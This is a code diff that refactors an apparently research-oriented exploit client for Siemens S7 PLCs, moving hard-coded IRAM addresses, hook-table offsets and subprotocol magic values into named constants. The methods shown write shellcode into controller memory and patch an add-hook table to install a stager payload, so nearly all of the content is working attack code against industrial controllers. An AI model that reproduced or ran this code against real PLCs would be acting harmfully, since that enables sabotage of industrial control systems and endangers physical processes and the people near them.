@@ -18,12 +18,21 @@ SEND_REQ_SAFETY_SLEEP_AMT = 0.01
 STAGER_PL_FILENAME = "payloads/stager/stager.bin"
 TURBO_STAGER_PL_FILENAME = "payloads/turbo_stager/turbo_stager.bin"
 DUMPMEM_PL_FILENAME = "payloads/dump_mem/build/dump_mem.bin"
-FIRST_PAYLOAD_LOCATION = 0x10010100
 MAX_MSG_LEN = 192 - 2
+
+# Addresses and Memory Layout
+FIRST_PAYLOAD_LOCATION = 0x10010100
+IRAM_STAGER_START = 0x10030100
+IRAM_STAGER_END = 0x100303FC
+IRAM_STAGER_MAX_SIZE = IRAM_STAGER_END - IRAM_STAGER_START
+ADD_HOOK_TABLE_START = 0x1003ABA0
+
+# Protocol and Hook Constants
 DEFAULT_STAGER_ADDHOOK_IND = 0x20
 DEFAULT_SECOND_ADD_HOOK_IND = 0x1a
-ADD_HOOK_TABLE_START = 0x1003ABA0
 ANSW_ENTER_SUBPROTO_SUCCESS = "\x80\x00"
+SUBPROT_80_MODE_IRAM = 1
+SUBPROT_80_MODE_MAGICS = [None, 0x3BC2, 0x9d26, 0xe17a, 0xc54f]
 
 class SiemensS7Client:
     def __init__(self, r):
@@ -113,9 +122,8 @@ class SiemensS7Client:
         return None
 
     def enter_subproto_handler(self, mode):
-        magics = [None, 0x3BC2, 0x9d26, 0xe17a, 0xc54f]
-        assert (1 <= mode <= len(magics))
-        return self.invoke_primary_handler(0x80, struct.pack(">H", magics[mode]))
+        assert (1 <= mode <= len(SUBPROT_80_MODE_MAGICS))
+        return self.invoke_primary_handler(0x80, struct.pack(">H", SUBPROT_80_MODE_MAGICS[mode]))
     
     def leave_subproto_handler(self):
         self.send_packet(chr(0x81)+"\xD0\x67")
@@ -133,7 +141,7 @@ class SiemensS7Client:
         assert(tar + len(contents) <= 0x10800000)
 
         if not already_in_80_handler:
-            self.enter_subproto_handler(1)
+            self.enter_subproto_handler(SUBPROT_80_MODE_IRAM)
 
         target_argument = tar-0x10000000
         self._raw_subproto_write(target_argument, len(contents)*"\xff", True)
@@ -146,7 +154,7 @@ class SiemensS7Client:
         assert(len(contents) % 2 == 0)
         assert(0x10000000 <= tar and tar + len(contents) <= 0x10800000)
 
-        answ = self.enter_subproto_handler(1)
+        answ = self.enter_subproto_handler(SUBPROT_80_MODE_IRAM)
         assert(answ == ANSW_ENTER_SUBPROTO_SUCCESS)
 
         chunk_size = 16
@@ -164,8 +172,8 @@ class SiemensS7Client:
         self.exploit_write_to_iram(tar_addr, shellcode)
         self.exploit_write_to_iram(ADD_HOOK_TABLE_START + 8 * add_hook_no + 2, "\x00\xff" + struct.pack(">I", tar_addr))
 
-    def install_stager(self, shellcode, tar_addr=0x10030100, add_hook_no=DEFAULT_STAGER_ADDHOOK_IND):
-        assert(0 < len(shellcode) <= (0x100303FC - 0x10030100))
+    def install_stager(self, shellcode, tar_addr=IRAM_STAGER_START, add_hook_no=DEFAULT_STAGER_ADDHOOK_IND):
+        assert(0 < len(shellcode) <= IRAM_STAGER_MAX_SIZE)
         self._exploit_install_add_hook(tar_addr, shellcode, add_hook_no)
         return add_hook_no
 
